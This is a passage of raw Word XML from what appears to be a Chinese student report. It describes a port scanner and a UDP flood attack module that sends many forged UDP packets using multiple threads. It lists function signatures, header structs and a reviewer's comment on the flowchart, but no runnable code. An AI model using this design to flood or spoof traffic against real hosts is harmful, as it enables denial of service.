          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1085" w:name="_Toc482522640"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>主要函数</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1085"/>
    </w:p>
    <w:p w14:paraId="36E0E1AB" w14:textId="720612D7" w:rsidR="001C4DAF" w:rsidRPr="001C4DAF" w:rsidRDefault="00C64864" w:rsidP="008F6EEA">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>如表</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>.4</w:t>
      </w:r>
      <w:r w:rsidR="00E87471" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>getICMP</w:t>
      </w:r>
      <w:r w:rsidR="00E87471">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数打开选择的网卡，捕获ICMP数据包端口不可达的数据并进行解析，</w:t>
      </w:r>
      <w:r w:rsidR="00E87471" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>CreatePacket</w:t>
      </w:r>
      <w:r w:rsidR="00E87471">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>用于创建UDP数据包，</w:t>
      </w:r>
      <w:r w:rsidR="00E87471" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>SendPacket</w:t>
      </w:r>
      <w:r w:rsidR="00E87471">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>用于发送数据包。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="250897DB" w14:textId="5DD16DFC" w:rsidR="00702C59" w:rsidRPr="00C019FA" w:rsidRDefault="00702C59" w:rsidP="00702C59">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C019FA">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">表 </w:t>
      </w:r>
      <w:r w:rsidRPr="00C019FA">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidR="00C64864" w:rsidRPr="00C019FA">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>.4</w:t>
      </w:r>
      <w:r w:rsidRPr="00C019FA">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>端口扫描函数说明</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af2"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1896"/>
        <w:gridCol w:w="3290"/>
        <w:gridCol w:w="3116"/>
      </w:tblGrid>
      <w:tr w:rsidR="00702C59" w:rsidRPr="00E90326" w14:paraId="0566F511" w14:textId="77777777" w:rsidTr="00F2695D">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="54F8B81E" w14:textId="1E94074B"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函数</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="64BC27F8"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参数</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="21564377"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功能</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00702C59" w:rsidRPr="00E90326" w14:paraId="178288A2" w14:textId="77777777" w:rsidTr="00F2695D">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="59D42F91"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getICMP()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="3C31B5D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LPVOID lpParameter</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="5A194BEC"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702C59" w:rsidRPr="00E90326" w14:paraId="25EBBFF8" w14:textId="77777777" w:rsidTr="00F2695D">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="05C077E9"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CreatePacket()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="43C4DCF1"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SourceMAC,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="725CE556"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DestinationMAC,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70D701A3" w14:textId="77777777" w:rsidR="00702C59" w:rsidRPr="00E90326" w:rsidRDefault="00702C59" w:rsidP="001C4DAF">
            <w:pPr>
              <w:spacing w:beforeLines="0" w:afterLines="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E90326">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
              <w:t>unsigned int   SourceIP,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0366AB8D" w14:textId="77777777" w:rsidR="00702C59" w:rsidRPr="00E90326" w:rsidRDefault="00702C59" w:rsidP="001C4DAF">
            <w:pPr>
              <w:spacing w:beforeLines="0" w:afterLines="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E90326">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
              <w:t>unsigned int   DestinationIP,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14CFF1E7" w14:textId="77777777" w:rsidR="00702C59" w:rsidRPr="00E90326" w:rsidRDefault="00702C59" w:rsidP="001C4DAF">
            <w:pPr>
              <w:spacing w:beforeLines="0" w:afterLines="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E90326">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>unsigned short SourcePort,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="087FEECF" w14:textId="77777777" w:rsidR="00702C59" w:rsidRPr="00E90326" w:rsidRDefault="00702C59" w:rsidP="001C4DAF">
            <w:pPr>
              <w:spacing w:beforeLines="0" w:afterLines="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E90326">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
              <w:t>unsigned short DestinationPort,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2EF91E0B" w14:textId="77777777" w:rsidR="00702C59" w:rsidRPr="00E90326" w:rsidRDefault="00702C59" w:rsidP="001C4DAF">
            <w:pPr>
              <w:spacing w:beforeLines="0" w:afterLines="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E90326">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
              <w:t>unsigned char* UserData,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2602513B" w14:textId="77777777" w:rsidR="00702C59" w:rsidRPr="00E90326" w:rsidRDefault="00702C59" w:rsidP="001C4DAF">
            <w:pPr>
              <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E90326">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
              <w:t>unsigned int   DataLen</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="41F317FB"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lastRenderedPageBreak/>
              <w:t>创建UDP数据包</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00702C59" w:rsidRPr="00E90326" w14:paraId="0DB06FAC" w14:textId="77777777" w:rsidTr="00F2695D">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="60304104"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rPr>
              <w:t>SendPacket()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="363B31F0" w14:textId="77777777" w:rsidR="00702C59" w:rsidRPr="00E90326" w:rsidRDefault="00702C59" w:rsidP="001C4DAF">
            <w:pPr>
              <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E90326">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
              <w:t>pcap_if_t* Device</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="17F784DA" w14:textId="77777777" w:rsidR="00702C59" w:rsidRPr="00E90326" w:rsidRDefault="00702C59" w:rsidP="001C4DAF">
            <w:pPr>
              <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E90326">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
              </w:rPr>
              <w:t>发送数据包</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7963C241" w14:textId="62E9E741" w:rsidR="007129C2" w:rsidRDefault="007129C2" w:rsidP="007129C2">
      <w:pPr>
        <w:pStyle w:val="20505"/>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1086" w:name="_Toc482522641"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>UDP Flood攻击</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1086"/>
    </w:p>
    <w:p w14:paraId="5083B410" w14:textId="2EE35EB5" w:rsidR="00BC7545" w:rsidRDefault="00BC7545" w:rsidP="00BC7545">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="5115"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1087" w:name="_Toc482522642"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>流程图</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1087"/>
    </w:p>
    <w:p w14:paraId="657811C5" w14:textId="3D607736" w:rsidR="003F07C6" w:rsidRDefault="003F07C6" w:rsidP="003F07C6">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>如图所示，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>UDP F</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>lood攻击主要为构建大量的udp数据包，利用多线程的技术发送大量伪造的数据包。主要使用</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>CreatePacket</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>SendPacket</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A4EAE0C" w14:textId="4D653829" w:rsidR="003F07C6" w:rsidRDefault="003F07C6" w:rsidP="003F07C6">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="09F7E4AD" wp14:editId="43342F1D">
            <wp:extent cx="1630680" cy="4221190"/>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3145" cy="4227572"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="63B501FF" w14:textId="59A23D20" w:rsidR="003F07C6" w:rsidRPr="00341228" w:rsidRDefault="003F07C6" w:rsidP="00341228">
      <w:pPr>
        <w:pStyle w:val="af3"/>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E57DDC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">图 </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57DDC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>4 .</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57DDC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00E57DDC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ 图 \* ARABIC \s 2 </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00E57DDC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="00E57DDC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:noProof/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57DDC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="00E57DDC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> UDP F</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57DDC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:noProof/>
        </w:rPr>
        <w:t>lood攻击流程图</w:t>
      </w:r>
      <w:ins w:id="1088" w:author="renxt" w:date="2017-05-13T20:59:00Z">
        <w:r w:rsidR="00EA0369">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:noProof/>
          </w:rPr>
          <w:t>（</w:t>
        </w:r>
        <w:r w:rsidR="00EA0369">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>第2个框对吗？框内用文字说明。</w:t>
        </w:r>
        <w:r w:rsidR="00EA0369">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:noProof/>
          </w:rPr>
          <w:t>）</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="679F9DF4" w14:textId="1E162ABC" w:rsidR="00BC7545" w:rsidRDefault="00BC7545" w:rsidP="00BC7545">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="5115"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1089" w:name="_Toc482522643"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>主要数据</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1089"/>
    </w:p>
    <w:p w14:paraId="675A787F" w14:textId="23F3BE18" w:rsidR="00A64E0D" w:rsidRPr="008C1B35" w:rsidRDefault="007F2C0D" w:rsidP="008C1B35">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:firstLine="420"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>如表4.5所示，</w:t>
      </w:r>
      <w:r w:rsidR="00A64E0D" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>ip_address</w:t>
      </w:r>
      <w:r w:rsidR="00A64E0D">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>是IP地址的表示，</w:t>
      </w:r>
      <w:r w:rsidR="00A64E0D" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>ip_header</w:t>
      </w:r>
      <w:r w:rsidR="00A64E0D">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>为I</w:t>
      </w:r>
      <w:r w:rsidR="00A64E0D">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r w:rsidR="00A64E0D">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>头部，</w:t>
      </w:r>
      <w:r w:rsidR="00A64E0D" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>udp_header</w:t>
      </w:r>
      <w:r w:rsidR="00A64E0D">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>为UDP头部。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3789BFE6" w14:textId="7D22ECF2" w:rsidR="00A64E0D" w:rsidRDefault="00A64E0D" w:rsidP="00A64E0D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>表</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008B0932">
        <w:t>4.</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A64E0D" w:rsidRPr="00E90326" w14:paraId="0D5F264B" w14:textId="77777777" w:rsidTr="00CF6272">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2122" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3A93A75B"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4D882EDE"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7C7AC83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介绍</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A64E0D" w:rsidRPr="00E90326" w14:paraId="55B1A997" w14:textId="77777777" w:rsidTr="00CF6272">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2122" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="555EEDDC"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ip_address</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3412" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="35D7ED16" w14:textId="6FADCF56" w:rsidR="00A64E0D" w:rsidRPr="00E90326" w:rsidRDefault="006E62FA" w:rsidP="00CF6272">
            <w:pPr>
              <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r w:rsidR="00A64E0D" w:rsidRPr="00E90326">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
              <w:t>ypedef struct ip_address</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2768" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="37AF2881"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hint="eastAsia"/>
              </w:rPr>
              <w:t>IP地址表示</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A64E0D" w:rsidRPr="00E90326" w14:paraId="1F79AA14" w14:textId="77777777" w:rsidTr="00CF6272">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2122" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1BC3DFB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ip_header</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3412" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="44698156"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1E9399A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A64E0D" w:rsidRPr="00E90326" w14:paraId="6E097501" w14:textId="77777777" w:rsidTr="00CF6272">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2122" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="197E8D05"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udp_header</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3412" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="26F4C4CC" w14:textId="77777777" w:rsidR="00A64E0D" w:rsidRPr="00E90326" w:rsidRDefault="00A64E0D" w:rsidP="00CF6272">
            <w:pPr>
              <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E90326">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
              <w:t>typedef struct udp_header</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2768" w:type="dxa"/>
          </w:tcPr>
